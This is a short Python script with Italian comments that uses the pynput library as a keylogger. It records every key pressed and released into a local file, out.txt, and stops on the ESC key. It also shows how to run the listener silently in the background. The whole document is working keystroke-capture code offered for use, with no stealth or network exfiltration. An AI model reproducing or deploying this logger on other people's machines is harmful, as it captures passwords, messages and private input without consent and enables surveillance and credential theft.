# Importa il modulo per intercettare eventi della tastiera
from pynput import keyboard
# Importa un contesto per reindirizzare l'output di print su file
from contextlib import redirect_stdout

# Funzione chiamata quando un tasto viene premuto
def on_press(key):
    try:
        # Prova a ottenere il carattere del tasto premuto (per lettere, numeri, simboli)
        with open('out.txt', 'a') as f:  # Apre il file out.txt in modalità append
            with redirect_stdout(f):     # Reindirizza l'output di print sul file
                print('key {0} pressed'.format(key.char))  # Scrive il tasto premuto
    except AttributeError:
        # Se il tasto non ha un carattere (es. tasti speciali come Shift, Ctrl)
        with open('out.txt', 'a') as f:
            with redirect_stdout(f):
                print('key {0} pressed'.format(key))  # Scrive il tasto speciale premuto

# Funzione chiamata quando un tasto viene rilasciato
def on_release(key):
    with open('out.txt', 'a') as f:
        with redirect_stdout(f):
            print('key {0} released'.format(key))  # Scrive il tasto rilasciato
    # Se viene premuto ESC, termina il listener
    if key == keyboard.Key.esc:
        return False  # Questo ferma il listener

# Crea un listener della tastiera che blocca l'esecuzione finché non viene premuto ESC
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()  # Mantiene attivo il listener

# Alternativa: avviare il listener in modalità non bloccante
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()  # Il listener funziona in background
